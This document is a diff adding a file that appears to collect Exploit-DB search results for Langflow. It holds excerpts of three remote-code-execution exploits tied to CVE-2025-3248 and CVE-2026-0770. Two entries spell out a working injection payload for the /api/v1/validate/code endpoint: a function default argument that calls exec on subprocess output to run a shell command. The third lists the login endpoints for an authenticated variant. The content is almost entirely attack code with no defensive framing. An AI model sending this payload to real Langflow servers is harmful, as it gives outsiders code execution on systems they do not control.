@@ -1,0 +1,36 @@
+===== Exploit-DB 52364 =====
+Query: langflow
+Title: Langflow 1.2.x - Remote Code Execution (RCE)
+Source: /usr/share/exploitdb/exploits/multiple/webapps/52364.py
+
+# Version: <= 1.2.x
+# CVE: CVE-2025-3248
+import requests
+import subprocess
+endpoint = "/api/v1/validate/code"
+code = "def run(cd=exec(__import__('subprocess').check_output('id', shell=True))): pass"
+
+===== Exploit-DB 52262 =====
+Query: langflow
+Title: Langflow 1.3.0 - Remote Code Execution (RCE)
+Source: /usr/share/exploitdb/exploits/multiple/remote/52262.txt
+
+# Version: Langflow < 1.3.0
+# CVE: CVE-2025-3248
+import requests
+import subprocess
+endpoint = "/api/v1/validate/code"
+code = "def run(cd=exec(__import__('subprocess').check_output('id', shell=True))): pass"
+
+===== Exploit-DB 52597 =====
+Query: langflow
+Title: Langflow 1.3.0 - Remote Code Execution
+Source: /usr/share/exploitdb/exploits/multiple/webapps/52597.py
+
+# Version: 1.2.0
+# CVE: CVE-2026-0770
+import httpx
+import subprocess
+login = "/api/v1/login"
+auto_login = "/api/v1/auto_login"
+endpoint = "/api/v1/validate/code"
